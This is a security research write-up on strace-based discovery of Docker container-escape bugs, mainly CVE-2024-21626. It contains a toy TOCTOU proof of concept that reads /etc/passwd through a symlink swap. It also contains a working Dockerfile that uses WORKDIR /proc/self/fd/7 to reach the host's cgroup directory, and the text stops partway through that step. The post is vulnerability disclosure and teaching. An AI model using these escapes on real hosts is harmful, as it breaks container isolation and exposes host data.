
Leaky Vessels deep dive: Escaping from Docker one syscall at a time
Written by:
Rory McNamara

##
#
https://snyk.io/blog/leaky-vessels-container-vuln-deep-dive/
#
https://blog.sighup.io/anatomy-of-a-cve/
#
https://aws.amazon.com/security/security-bulletins/AWS-2024-001/
#
https://www.wiz.io/blog/leaky-vessels-container-escape-vulnerabilities
#
##

February 6, 2024

45 mins read
Breaking container isolation by racing the filesystem
The Snyk Security Labs team recently embarked on a research project into the Docker engine. During this project, I had the opportunity to perform what is arguably my favorite kind of research using my favorite selection of tools. The research panned out quite successfully, and we identified four high severity vulnerabilities that allow a malicious attacker to break out of a container environment with a controlled Dockerfile under docker build and, in one case, docker run. These vulnerabilities have been assigned CVE-2024-21626, CVE-2024-23651, CVE-2024-23652, and CVE-2024-23653. You can read the summary of our Docker vulnerability findings on the Snyk blog here, but stick with this article for in-depth information about how each of these vulnerabilities was identified.

Containerization, specifically Docker, creates standalone workloads like web applications or backend APIs. Once built, these workloads are often deployed into shared or semi-shared infrastructure, such as organization-wide Kubernetes clusters. While not inherently a security solution, Docker’s containers offer isolation-based security when appropriately configured to ensure that workloads cannot compromise each other, or the underlying infrastructure. The ability to escape from such a container and access the underlying infrastructure and other workloads can potentially cause a significant security impact in many environments. Our aim in this research was to achieve such a container escape.

In this post, we will discuss the research techniques used to identify the new vulnerabilities, how each specific vulnerability was manifested and identified, and how we turned our research into a proof of concept. We hope to shed light on this relatively unrepresented userland operating system security area and show that you don’t always need complicated and expensive tooling to achieve significant results.

Finding race conditions in userland Linux
What is a race condition?
Race conditions are a vulnerability class that occurs when an application interacts with a shared system, assuming its actions occur as expected and are free from interference. In the case of our vulnerabilities, the shared system involved is the Linux filesystem. The identified vulnerabilities were due to the application assuming that its actions occurred in isolation and, therefore, failed to appropriately guard against outside interference. This resulted in situations where the Docker engine could be tricked into performing actions with a higher privilege than are usually accessible — a "confused deputy" of sorts.

Race conditions are not inherently deterministic and, therefore, require a manual review of system functionality to identify potential cases of a race condition, which can then be exploited. In the following sections, we will understand potential tooling for this job and how such vulnerabilities are readily identifiable at this level.

Intro to strace
For our purposes as part of this research, our interests lie in userland Linux. The Docker Engine runs as a daemon on a Linux system, so we can use userland tools to investigate its inner workings to try to find race conditions. One such tool is strace. 

strace is a powerful tool on Linux that allows us to attach to specific processes and output a list of all the syscalls made by the process and its associated arguments. Syscalls on Linux are the main entry point into the kernel and are required to interact with the filesystem, network, or other processes.

We can see this in action with the following example:

$ strace ./helloworld
[snipped for brevity]
openat(AT_FDCWD, "TEST", O_WRONLY|O_CREAT, 0644) = 3
write(3, "Hello World!", 12)            = 12
close(3)                                = 0
exit_group(0)                           = ?
+++ exited with 0 +++
This strace output corresponds to the following C program:

#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

int main() {
  int fd = open("TEST", O_WRONLY | O_CREAT, 0644);
  write(fd, "Hello World!", 12);
  close(fd);
}
As you can see, there is a strong correlation between the lines of code and the syscalls in our example, and we do not gain much by having used strace. However, strace shines in much more complicated code. As a further example, we can modify our code to be much more complex:
```
#include <fcntl.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define NEW_FILE_PERMISSIONS 0644

char *get_filename() { return strdup("TEST"); }

int open_for_writing_on_linux(char *filename) {
  int fd = open(filename, O_WRONLY | O_CREAT, NEW_FILE_PERMISSIONS);
  return fd;
}

int open_a_file() {
  int fd = open_for_writing_on_linux(get_filename());
  return fd;
}

void write_some_text(int fd) {
  char *text = "Hello World!";
  int textlen = strlen(text);
  write(fd, text, textlen);
}

int main() {
  int fd = open_a_file();
  write_some_text(fd);
  close(fd);
}
While still not as complex as a real application, it’s clear that complexity increases significantly with abstraction and flexibility. If you were to perform a manual code review against such code, it would take longer than in our first example. However, observe the output of strace against our new, more complex code:

```

$ strace ./helloworld
[snipped for brevity]
openat(AT_FDCWD, "TEST", O_WRONLY|O_CREAT, 0644) = 3
write(3, "Hello World!", 12)            = 12
close(3)                                = 0
exit_group(0)                           = ?
+++ exited with 0 +++
It’s precisely the same! strace has cut through the complexity of our new code and given us the same output, that of what the program is actually doing (at least in terms of syscalls).

It is worth mentioning at this point that strace can only show you what is happening, not what can happen. It’s still necessary to deeply understand the system being investigated to ensure you can exercise all the interesting functionality. We can’t find a vulnerability with strace if strace never sees the vulnerable code!

Identifying race conditions with strace
Now that we have a high-level understanding of what strace does, we can look at how the vulnerabilities we’re interested in (i.e. race conditions) manifest under strace. We will again write a toy program and investigate it with strace.
```
#include <errno.h>
#include <fcntl.h>
#include <libgen.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

int validate_path(char *path) {
  char *expandedpath = realpath(path, NULL); // <-- 1
  char *cwd = realpath(".", NULL);

  char *dir = dirname(strdup(expandedpath));
  if (strcmp(dir, cwd)) {
    printf("File must be in current directory\n");
    return 1;
  }

  struct stat st;
  if (lstat(expandedpath, &st)) { // <-- 2
    printf("Stat error: %s\n", strerror(errno));
    return 1;
  }

  if (!S_ISREG(st.st_mode)) {
    printf("File must be regular file\n");
    return 1;
  }
  return 0;
}

char *fake_ipc_get_filename(int argc, char *argv[]) {
  // for the sake of this example, pretend this is some kind of real IPC
  // such as a network server, unix socket, dbus endpoint etc
  if (argc != 2) {
    return NULL;
  }
  return strdup(argv[1]);
}

int main(int argc, char *argv[]) {
  char *filename = fake_ipc_get_filename(argc, argv);
  if (filename == NULL) {
    printf("No filename specified\n");
    return 1;
  }

  if (validate_path(filename)) {
    return 1;
  }

  sleep(5); // we pretend to do some computation here // <-- 3

  int fd = open(filename, O_RDONLY); // <-- 4
  char buf[512];
  int readlen = read(fd, buf, 512);
  write(1, buf, readlen);
  close(fd);
}
```

The example code above will take a file path from some kind of IPC (we’ve faked it here by just using a command line argument), check to ensure that it’s a valid file in the current directory, and if so, read it. We can see by using it that it looks relatively secure:
```
$ ./race /etc/passwd
File must be in current directory
$ ln -s /etc/passwd passwd
$ ./race ./passwd
File must be in current directory
$ ./race ./../../../../etc/passwd
File must be in current directory
Let us look at this application under strace:

$ strace -tt ./race ./test
[snipped for brevity]
12:24:55.907881 getcwd("/example", 1024) = 9 
12:24:55.907924 readlink("/example/test", 0x7fff324dfcf0, 1023) = -1 EINVAL (Invalid argument) <-- 1
12:24:55.907985 getcwd("/example", 1024) = 9
12:24:55.908022 newfstatat(AT_FDCWD, "/example/test", {st_mode=S_IFREG|0664, st_size=13, ...}, AT_SYMLINK_NOFOLLOW) = 0 <-- 2
12:24:55.908066 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=5, tv_nsec=0}, 0x7fff324e0610) = 0 <-- 3
12:25:00.908397 openat(AT_FDCWD, "./test", O_RDONLY) = 3 <-- 4
12:25:00.908575 read(3, "Hello World!\n", 512) = 13
12:25:00.908678 write(1, "Hello World!\n", 13Hello World!
) = 13
12:25:00.908751 close(3)                = 0
12:25:00.908828 exit_group(0)           = ?
12:25:00.909548 +++ exited with 0 +++
```


This time, I’ve added the strace argument -tt, which gives us timestamps at the start of each line.

We can match up the output from strace with our code. At 1, we can see the call to realpath to resolve our provided path. We can double-check this by passing in a more unique path to be sure. We should see something like this:

readlink("/example/I_CONTROL_THIS_VALUE", 0x7ffe19b1c3e0, 1023) = -1 EINVAL (Invalid argument)
At 2, we can see our call to lstat, used to validate the file type. We can even see the return value from stat — showing us that it’s of type S_IFREG, as the code requires. At 3, we see a call to sleep. In our contrived example, this is to represent some further computation; we’ll see later what this could really look like. Finally, at 4, our file is opened and read to see the contents.

But where is the vulnerability? The code checks our value for safety, and we can’t change anything once the program runs.

As many of you will know or have guessed, the key is the time difference between the check of our value (using stat) and the use of our value (when opening the file). This is a classic time of check, time of use (TOCTOU) race condition. Now that we’ve identified the issue, we must figure out how to exploit it. 

We know that we can’t modify the program or its data while it is running (memory corruption vulnerabilities being out of scope for this post), but what we can modify is the world around the application as it runs. The code assumes nothing will change while it is sleeping, but as we’re in control of the current directory, we can make it so that assumption is false.

To exploit this vulnerability, we need to consider what we know and can control, which will help inform us as to what we can achieve via exploitation.

What we know:

The application takes a value that we partially control. We can modify the filename but not the full path.

The application checks this value to ensure that it is in our current directory and that it is an actual file.

If the checks pass, the application will read our file.

If we can change the checked value after it has been checked but before it is used, the application will continue without further consideration of the value.

What we control:

We control the filename.

We control the execution timing of the application.

We control the current directory.

Putting all of this together gives us a few pointers to exploitation. Firstly, the application reads files. The natural exploitation of this would be reading unintended files, such as those outside the current directory. The classic target would be something like /etc/passwd. The second pointer is that there’s a time window between when the application checks the value and when it actually uses the value. It assumes nothing happens in this window, but we know that since we control the environment the application is running in, we can change the current directory around the application while it sleeps. Our final key to the puzzle is that, on Linux, a symbolic link is a special type of file that can live in one directory but point to another file or directory elsewhere on the system.

As we saw when testing our application above, directly using a symbolic link with our vulnerable code will not be successful — the call to realpath can protect against such vulnerabilities. But what if we put a symbolic link in place after the call to realpath has been completed? Now that we have formulated a plan, we can build some code to test it. I will use bash here as it’s simple for such a small proof of concept. The proof of concept looks like the following:

touch test # <-- 1

./race ./test & # <-- 2
RACEPID=$!

sleep 2 # <-- 3

rm test # <-- 4
ln -s /etc/passwd test

wait $RACEPID
We can walk through multiple stages to the proof of concept.

In step 1, we set up our current directory to pass all our checks. We need something that will work, or the application will exit, so we create a blank file as our dummy.

In step 2, we execute the vulnerable application in the background. We do this so that we can perform actions while it runs, which is critical for exploiting this vulnerability!

In step 3, we wait briefly to line up with the race application blindly. We are guessing here that the vulnerable application has completed its checks and is waiting for its sleep function. Since it will sleep longer than we will, we can reliably assume that, once our proof of concept sleep is complete, our vulnerable application is in the state we want it to be.

Finally, in step 4, we will delete the valid file we initially created and swap it for a symbolic link. Given our timing assumptions, the vulnerable application will not check this symbolic link and will blindly continue as if it were the original validated file.

Running this script, we see success!

$ sh poc.sh
root:x:0:0:root:/root:/usr/bin/bash
[snipped for brevity]
We have been able to exploit this race condition and read a file we were not supposed to be able to read, given the validation performed by the application.

strace conclusion
In this section, we have demonstrated that the strace tool can be used to cut through complexity and focus on what’s actually happening in our target application, resulting in the successful exploitation of a toy TOCTOU vulnerability.

Finding race conditions in Docker
In this section, we will repeat our technique against the Docker engine and uncover several real, high-severity vulnerabilities.

strace in the real world
strace is very powerful, but also very verbose. When investigating a real-world project, there will be considerably more output you will need to wade through. In my experience, race conditions are rarely 3 lines apart in a strace log and require some wading through to find what you’re looking for. There are a few useful techniques for cutting down the uninteresting noise when using strace.

The first is merely to capture less. strace offers several filtering options for the syscalls it will log, most straightforward of which is the -e flag. At its minimum, this flag will take a comma-separated list of syscalls, which it will positively filter for. In our above example, we could have passed -e newfstatat,openat. This would have only shown us the newfstatat and openat calls in the output, removing a lot of other noise that I have already removed above. Along with the timestamps (the -tt flag), this would have revealed the race condition with considerably fewer lines of output. While powerful, you will potentially lose a lot of context using this method, and it requires some level of understanding of the patterns of the system you are targeting to ensure that you are filtering in and out the right sets of data.

My preferred method, which we will see as we explore Docker, is merely using controlled values as "needles", which we can grep for in the "haystack" of strace output. By using -ff and -o, strace output will create one log file per process of your target in the same format as normal output, which allows for the use of standard searching tools. You can then use this to quickly search with grep for specific syscalls, awk for small syscall blocks, or any other text processing tools you are effective with (vim being a personal favorite for this). The trick here is to use unique and searchable values in your input (e.g., directories called FINDME are unlikely to otherwise be in use and are, therefore, good unique searchable terms), allowing for a much cleaner search of the strace output.

Finally, there is experience. When you have been working with strace output for some time, you will understand what syscalls are potentially interesting for your research and what syscalls can be universally ignored. For example, when looking for filesystem-based race conditions, calls to epoll_ctl/futex/epoll_pwait can largely be ignored and often take up a considerable chunk of strace output in more complex systems.

You’re out of order: CVE-2024-21626
Our first example is CVE-2024-21626. While not strictly a race condition vulnerability as we’ve discussed so far, it is at the very least closely related and can be found using the same techniques. As a simple example, it also gives us a nice place to start looking at a real system.

Initial exploration
For this vulnerability, we investigated the WORKDIR Dockerfile instruction. This instruction will specify the current working directory upon execution for future build and run-time operations. We will first investigate how this works to identify when this occurs and if there are any potential problems here.

Step 1 is a minimal Dockerfile that we can use to iterate upon while also providing us enough of a testbed to find what we are looking for:

FROM alpine
RUN mkdir /FINDME
WORKDIR /FINDME
RUN pwd
This very minimal example will set the WORKDIR to a directory we have freshly created, using a value ("FINDME") that we can easily search for. We will attach to the Docker engine with sudo strace -p $(pidof dockerd) -ff -o strace.log -s 128 -tt and build this example using docker build .

Once the build has completed, strace can be exited with ^C, leaving us with 94 strace logs, in the form strace.log.[pid]. With these logs, we can now search for our searchable value "FINDME". I have used ag here as I like how the output is effectively grouped per process, but grep will work just as well.

strace.log.788149
224:14:59:22.590509 read(3, "{\"args\":[\"/bin/sh\",\"-c\",\"pwd\"],\"env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"cwd\":\"/FINDME\",\"capa"..., 512) = 512
539:14:59:22.716274 newfstatat(AT_FDCWD, "/FINDME", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
631:14:59:22.730979 chdir("/FINDME")        = 0
816:14:59:22.738625 getcwd("/FINDME", 4096) = 8
823:14:59:22.738855 writev(1, [{iov_base="/FINDME", iov_len=7}, {iov_base="\n", iov_len=1}], 2) = 8

strace.log.788140
222:14:59:22.584175 write(15, "{\"args\":[\"/bin/sh\",\"-c\",\"pwd\"],\"env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"cwd\":\"/FINDME\",\"capa"..., 29450) = 29450

strace.log.788108
225:14:59:22.226985 read(3, "{\"args\":[\"/bin/sh\",\"-c\",\"mkdir /FINDME\"],\"env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"cwd\":\"/\",\""..., 512) = 512
796:14:59:22.365919 execve("/bin/sh", ["/bin/sh", "-c", "mkdir /FINDME"], 0xc0001e5bd8 /* 2 vars */) = 0
828:14:59:22.367905 execve("/bin/mkdir", ["mkdir", "/FINDME"], 0x7f3437e071b8 /* 4 vars */) = 0
837:14:59:22.368365 mkdir("/FINDME", 0777)  = 0

strace.log.602113
994:14:59:22.739116 read(38, "/FINDME\n", 32768) = 8
1093:14:59:22.777425 newfstatat(AT_FDCWD, "/var/lib/docker/overlay2/ipxf4kw9v12t2jxzjm9446lsm/diff/FINDME", {st_mode=S_IFDIR|0755, st_size=4096, ...}, AT_SYMLINK_NOFOLLOW) = 0
1094:14:59:22.777484 lgetxattr("/var/lib/docker/overlay2/ipxf4kw9v12t2jxzjm9446lsm/diff/FINDME", "security.capability", 0xc0016b9480, 128) = -1 ENODATA (No data available)
1095:14:59:22.777568 lgetxattr("/var/lib/docker/overlay2/ipxf4kw9v12t2jxzjm9446lsm/diff/FINDME", "trusted.overlay.opaque", 0xc0016b9500, 128) = -1 ENODATA (No data available)
1096:14:59:22.777637 openat(AT_FDCWD, "/var/lib/docker/overlay2/ipxf4kw9v12t2jxzjm9446lsm/diff/FINDME", O_RDONLY|O_CLOEXEC) = 36

strace.log.746205
7:14:59:22.062535 read(27, "\0\0?\0\0\0\0\0\3\0\0\0\0:\10\2\"6FROM alpine\nRUN mkdir /FINDME\nWORKDIR /FINDME\nRUN pwd\n\0\0\7\0\0\0\0\0\3\0\0\0\0\2\10\2", 32768) = 88
16:14:59:22.062820 write(36, "FROM alpine\nRUN mkdir /FINDME\nWORKDIR /FINDME\nRUN pwd\n", 54) = 54
779:14:59:22.535461 newfstatat(AT_FDCWD, "/var/lib/docker/buildkit/executor/5cf82fwiumld3vcs5d5l5pzyv/rootfs/FINDME", {st_mode=S_IFDIR|0755, st_size=4096, ...}, AT_SYMLINK_NOFOLLOW) = 0
780:14:59:22.535511 newfstatat(AT_FDCWD, "/var/lib/docker/buildkit/executor/5cf82fwiumld3vcs5d5l5pzyv/rootfs/FINDME", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0

strace.log.788141
101:14:59:22.561105 read(10, "/FINDME\n", 32768) = 8
103:14:59:22.738983 write(1, "/FINDME\n", 8) = 8

strace.log.603873
397:14:59:22.081923 read(36, "FROM alpine\nRUN mkdir /FINDME\nWORKDIR /FINDME\nRUN pwd\n", 512) = 54

strace.log.788099
230:14:59:22.220088 write(15, "{\"args\":[\"/bin/sh\",\"-c\",\"mkdir /FINDME\"],\"env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"cwd\":\"/\",\""..., 29454) = 29454

strace.log.723705
875:14:59:22.739513 write(26, "\0\0j\0\0\0\0\0\r\0\0\0\0e\32c\nGsha256:2a310cd0287ef1014723630b6c4999cd3c57d0f747f62177360f8c58bfd23d68\22\f\10\312\274\201\254\6\20\200\300\276\340\2\30\1\"\10/FINDME\n", 115) = 115

strace.log.603536
1234:14:59:22.444096 newfstatat(AT_FDCWD, "/var/lib/docker/overlay2/2lipp619sqwo5e3wdmf5avjhs/merged/FINDME", {st_mode=S_IFDIR|0755, st_size=4096, ...}, AT_SYMLINK_NOFOLLOW) = 0
1235:14:59:22.444143 newfstatat(AT_FDCWD, "/var/lib/docker/overlay2/2lipp619sqwo5e3wdmf5avjhs/merged/FINDME", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
We can see a lot of output here, but considerably fewer than the 21,000 lines in all files. Note that the files are in a functionally random order, but we can use the timestamps to identify the true order of operations.

Some of these processes we can immediately discount as not likely to be particularly interesting. strace.log.788141 looks to just be piping output between processes. strace.log.788140, strace.log.788099, strace.log.603873, and strace.log.723705 are only mentioning our string but not actually performing operations with it, so they can also be ignored as not directly interesting. We can see strace.log.788108 is directly performing actions with our path, but we can see from the initial lines of this block that this will directly correspond to the RUN mkdir /FINDME line in our input Dockerfile, so it’s working as intended.

We have a lead
Our next interesting process is strace.log.788149, which appears to be using chdir to enter our path. This is likely for the RUN pwd call in our input Dockerfile. However, since we don’t directly control this syscall (unlike, for example, if we explicitly called cd inside a RUN command), this warrants further investigation. The next step is to open this file and start to read. I won’t paste the entire output here because it’s over 800 lines long, but my methodology is to start from the top and just ignore or delete lines that don’t look applicable.

For example, there are 116 calls to sigaction which will set up a signal handler. This is not what we’re currently interested in (we only care about operations that touch or might otherwise impact the chdir to /FINDME we have identified). Some more calls, such as to mmap and mprotect, rt_sigprocmask, and other setup syscalls can be removed. This leads us to the following block:

14:59:22.590509 read(3, "{\"args\":[\"/bin/sh\",\"-c\",\"pwd\"],\"env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"cwd\":\"/FINDME\",\"capa"..., 512) = 512
14:59:22.590561 read(3, "_NET_BIND_SERVICE\",\"CAP_SYS_CHROOT\",\"CAP_KILL\",\"CAP_AUDIT_WRITE\"],\"Inheritable\":null,\"Permitted\":[\"CAP_CHOWN\",\"CAP_DAC_OVERRIDE\""..., 1024) = 1024
14:59:22.590593 read(3, "ull,\"extensions\":0,\"premount_cmds\":null,\"postmount_cmds\":null},{\"source\":\"devpts\",\"destination\":\"/dev/pts\",\"device\":\"devpts\",\"fl"..., 2048) = 2048
14:59:22.590629 read(3, "\",\"file_mode\":438,\"uid\":0,\"gid\":0},{\"type\":99,\"major\":1,\"minor\":5,\"permissions\":\"rwm\",\"allow\":true,\"path\":\"/dev/zero\",\"file_mode"..., 4096) = 4096
14:59:22.590681 read(3, "on\":4,\"errnoRet\":null,\"args\":[]},{\"name\":\"clock_getres\",\"action\":4,\"errnoRet\":null,\"args\":[]},{\"name\":\"clock_getres_time64\",\"act"..., 8192) = 8192
14:59:22.590742 read(3, "et\":null,\"args\":[]},{\"name\":\"mknod\",\"action\":4,\"errnoRet\":null,\"args\":[]},{\"name\":\"mknodat\",\"action\":4,\"errnoRet\":null,\"args\":[]"..., 16384) = 13578
This looks like a container configuration JSON blob and is likely the source of the /FINDME value for this process, reinforcing the earlier deletion of a few hundred lines.

We keep iterating in this fashion, deleting things we don’t care about as they don’t touch our value or impact our environment. We can observe several potentially interesting calls, such as those to mount, pivot_root, and various privilege-dropping syscalls, which we can keep in our log as relevant. This leaves us with 37 lines, heavily pared down from the original 800+. Note that some similar-but-repeated syscalls (mainly prctl) have been omitted here for clarity, but I would normally leave them in.

The numbers we have included on the left are references which we will discuss in the following paragraphs, the middle column is the absolute timestamp from strace, and the remainder of each line are the specific system calls and their arguments.

1  14:59:22.593535 mount("/var/lib/docker/buildkit/executor/5cf82fwiumld3vcs5d5l5pzyv/rootfs", "/var/lib/docker/buildkit/executor/5cf82fwiumld3vcs5d5l5pzyv/rootfs", 0xc0001d5dc0, MS_BIND|MS_REC, NULL) = 0
7  14:59:22.593719 openat(AT_FDCWD, "/var/lib/docker/buildkit/executor/5cf82fwiumld3vcs5d5l5pzyv/rootfs/proc", O_RDONLY|O_CLOEXEC|O_PATH) = 6
7  14:59:22.593873 mount("proc", "/proc/self/fd/6", "proc", MS_NOSUID|MS_NODEV|MS_NOEXEC, NULL) = 0
   14:59:22.594279 openat(AT_FDCWD, "/var/lib/docker/buildkit/executor/5cf82fwiumld3vcs5d5l5pzyv/rootfs/dev", O_RDONLY|O_CLOEXEC|O_PATH) = 6
   14:59:22.594394 mount("tmpfs", "/proc/self/fd/6", "tmpfs", MS_NOSUID|MS_STRICTATIME, "mode=0755,mode=755,size=65536k") = 0
   14:59:22.715358 chdir("/var/lib/docker/buildkit/executor/5cf82fwiumld3vcs5d5l5pzyv/rootfs") = 0
   14:59:22.715484 openat(AT_FDCWD, "/", O_RDONLY|O_DIRECTORY) = 6
2  14:59:22.715509 openat(AT_FDCWD, "/var/lib/docker/buildkit/executor/5cf82fwiumld3vcs5d5l5pzyv/rootfs", O_RDONLY|O_DIRECTORY) = 11
   14:59:22.715539 fchdir(11)              = 0
3  14:59:22.715563 pivot_root(".", ".")    = 0
   14:59:22.715665 fchdir(6)               = 0
   14:59:22.715700 mount("", ".", 0xc0000ae6b6, MS_REC|MS_SLAVE, NULL) = 0
   14:59:22.715744 umount2(".", MNT_DETACH) = 0
   14:59:22.715830 chdir("/")              = 0
   14:59:22.715876 close(11)               = 0
   14:59:22.715903 close(6)                = 0
4  14:59:22.716274 newfstatat(AT_FDCWD, "/FINDME", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
8  14:59:22.730345 openat(AT_FDCWD, "/proc/self/fd", O_RDONLY|O_CLOEXEC) = 6
9  14:59:22.730606 getdents64(6, 0xc0000f2000 /* 13 entries */, 8192) = 312
   14:59:22.730683 getdents64(6, 0xc0000f2000 /* 0 entries */, 8192) = 0
   14:59:22.730711 fcntl(3, F_SETFD, FD_CLOEXEC) = 0
   14:59:22.730738 fcntl(4, F_SETFD, FD_CLOEXEC) = 0
   14:59:22.730769 fcntl(5, F_SETFD, FD_CLOEXEC) = 0
   14:59:22.730803 fcntl(6, F_SETFD, FD_CLOEXEC) = 0
   14:59:22.730829 fcntl(7, F_SETFD, FD_CLOEXEC) = 0
   14:59:22.730854 fcntl(8, F_SETFD, FD_CLOEXEC) = 0
   14:59:22.730881 fcntl(9, F_SETFD, FD_CLOEXEC) = 0
   14:59:22.730918 fcntl(10, F_SETFD, FD_CLOEXEC) = 0
   14:59:22.730950 close(6)                = 0
5  14:59:22.730979 chdir("/FINDME")        = 0
P  14:59:22.733594 setgroups(11, [1, 2, 4, 0, 3, 6, 10, 11, 20, 26, 27]) = 0
P  14:59:22.733625 setgid(0)               = 0
P  14:59:22.733652 setuid(0)               = 0
P  14:59:22.733689 prctl(PR_SET_KEEPCAPS, 0) = 0
P  14:59:22.733756 prctl(PR_CAPBSET_DROP, CAP_DAC_READ_SEARCH) = 0
P  14:59:22.734537 prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_LOWER, CAP_CHOWN, 0, 0) = 0
6  14:59:22.737221 execve("/bin/sh", ["/bin/sh", "-c", "pwd"], 0xc0001e3bd8 /* 2 vars */) = 0
This output corresponds to the essence of the process, with our chdir at the center, and the things that contribute to the environment under which it is executed are also represented.

At 1, 2, and 3, we can see the mounting and entering of our container’s root filesystem.

At 4, we can see that our WORKDIR value is being checked, presumably to ensure that it is a present directory. We can validate this by passing an invalid value to our Dockerfile, re-running our setup, and observing the output being cut off as the process will bail at this point.

At 5, we can see our chdir.

Finally, at 6, we can see the handing over of control to the process we designated as part of our Dockerfile.

Something interesting is that privilege dropping, both uid and Linux capabilities, occurs after our chdir happens, tagged as P above. This leads to the question, is there anything left in the environment that points to outside the container roots (i.e., the underlying host), which we can access using the higher privileges at the time of the chdir call?

To answer this question, we can look at the other log items we have retained. Back at the top in 7, we can see that /proc is being mounted before the chdir call, which is potentially interesting. Inside the proc mount, the directory /proc/self/fd contains ‘magic symlinks’ to the file descriptors open by our current process. If any of those are directories, we can potentially use them as a target for our chdir. The second interesting point is immediately before the chdir, where the /proc/self/fd directory is being iterated over (8, 9), and each file descriptor has the FD_CLOEXEC flag applied. This flag will ensure that the identified file descriptors are closed when the execve syscall is executed later to ensure that no file descriptors held by the process are leaked into the command we control. However, while this flag has been applied to all identified file descriptors by the time the chdir is called, crucially, they are not actually closed.

Therefore, if any of the file descriptors with fd numbers 3 through 10 (not including 6, as that is explicitly closed) are a handle to a directory outside our root filesystem, we can use the chdir to retain access to such a directory, even after the file descriptor is closed on exec.

Validating the vulnerability idea with signal injection
Unfortunately, while possible, it would be very complicated to follow each file descriptor number back to its source, in most cases across multiple processes and threads, to identify what handles exist at that point in time. We need a debugger feature, but with strace, to stop the program execution at a point of our choice (of course, this could be done with gdb too). Fortunately for us, we can lean on another feature of strace (which, incidentally, I learned for precisely this vulnerability): signal injection. 

By providing the following flag to strace when attaching to the Docker daemon, we can cause strace to send the SIGSTOP signal to the process when it sees the pivot_root syscall: -e inject=pivot_root:signal=SIGSTOP. pivot_root was chosen because it is only used twice by Docker when building our Dockerfile, and we want to ensure we are stopping precisely where we think we are. By grepping the logs for such unique syscalls you can find other potential candidates. In this case, pivot_root is called once for the first RUN mkdir /FINDME, and then a second time inside our log output of interest from above, item 3. The SIGSTOP signal is helpful as it will effectively pause a process in place, allowing us to inspect the file descriptor table at our leisure.

Our next steps are therefore:

Attach strace with instructions to stop the process on pivot_root.

Run the Docker build with the same input.

Wait for Docker build to appear to hang; this will be the first SIGSTOP from strace.

Send a SIGCONT signal, as this isn’t the stop we care about.

Wait for Docker build to hang a second time; this is the stop we care about.

Find the pid of this process and observe its file descriptor table in /proc/[pid]/fd.

Once we are paused waiting for inspection, we can grep our strace log directory again to find the paused call to pivot_root, which will output something similar to the following at the end of the file:

15:54:24.531972 pivot_root(".", ".")    = 0
15:54:24.532095 --- SIGSTOP {si_signo=SIGSTOP, si_code=SI_KERNEL} ---
15:54:24.532123 --- stopped by SIGSTOP —
We can take the process id from the strace filename to either continue the process (with kill -CONT [pid]) or observe the fd table with ls:

$ sudo ls -l /proc/788747/fd
total 0
lr-x------ 1 root root 64 Dec 18 15:54 0 -> 'pipe:[8583688]'
l-wx------ 1 root root 64 Dec 18 15:54 1 -> 'pipe:[8583689]'
l-wx------ 1 root root 64 Dec 18 15:56 10 -> 'pipe:[8584671]'
lr-x------ 1 root root 64 Dec 18 15:56 11 -> /
l-wx------ 1 root root 64 Dec 18 15:54 2 -> 'pipe:[8583690]'
lrwx------ 1 root root 64 Dec 18 15:56 3 -> 'socket:[8583691]'
l-wx------ 1 root root 64 Dec 18 15:56 4 -> 'pipe:[8583693]'
l--------- 1 root root 64 Dec 18 15:56 5 -> /run/runc/ppsbrquqivvyayn2162wm2yz2/exec.fifo
lr-x------ 1 root root 64 Dec 18 15:54 6 -> /
l--------- 1 root root 64 Dec 18 15:56 7 -> /sys/fs/cgroup
lrwx------ 1 root root 64 Dec 18 15:56 8 -> 'anon_inode:[eventpoll]'
lr-x------ 1 root root 64 Dec 18 15:56 9 -> 'pipe:[8584671]'
This output is, therefore, the open file descriptors at the time of the pivot_root syscall in our original strace log. While there are many calls between the pivot_root and the chdir we care about, there are few enough we can manually trace which are still present at the time of the chdir. Most of these file descriptors can be immediately discounted. Pipe and Socket fds cannot be chdir-ed into, fd 6 we know to be explicitly closed, fd 11 we can reference against our full strace log (openat call in 2) to observe that it is our root filesystem anyway, after further investigation of 5 by grepping for the unique name we can confirm that it is also a fifo (as the name implies), and therefore, not a navigable directory.

Testing our theory
This leaves us with fd 7. This fd is a handle to a directory that was not observed to be opened in this process and definitely not after the pivot_root. This indicates that it is a handle to the host, "real", /sys/fs/cgroup directory. This is potentially very interesting as if we can successfully chdir into this path, via /proc/self/fd/7, we may have access to files outside our container. The fastest way to validate is to try so we can build out a new minimal Dockerfile to test our theory:

FROM alpine
WORKDIR /proc/self/fd/7
RUN ls -l
And we can build it and see what happens:

$ docker build --no-cache --progress=plain .
[snipped for brevity]
#5 [2/3] WORKDIR /proc/self/fd/7
#5 CACHED

#6 [3/3] RUN ls -l
#6 0.152 total 0
#6 0.152 drwxr-xr-x    2 root     root             0 Nov 24 20:30 buildkit
#6 0.152 -r--r--r--    1 root     root             0 Nov 21 11:20 cgroup.controllers
#6 0.152 -rw-r--r--    1 root     root             0 Nov 21 11:20 cgroup.max.depth
#6 0.152 -rw-r--r--    1 root     root             0 Nov 21 11:20 cgroup.max.descendants
#6 0.152 -rw-r--r--    1 root     root             0 Nov 21 11:20 cgroup.procs
[snipped for brevity]
We can see we’ve successfully chdir-ed into a cgroup mount, based on the filenames, but we have yet to confirm it is the root cgroup mount. Once again, the easiest way to validate is to try. We can create an indicator in the root cgroup mount and see it is indeed reflected in the output from docker build:

$ sudo mkdir /sys/fs/cgroup/0EXPLOIT
$ docker build --no-cache --progress=plain .
[snipped for brevity]
#6 [3/3] RUN ls -l
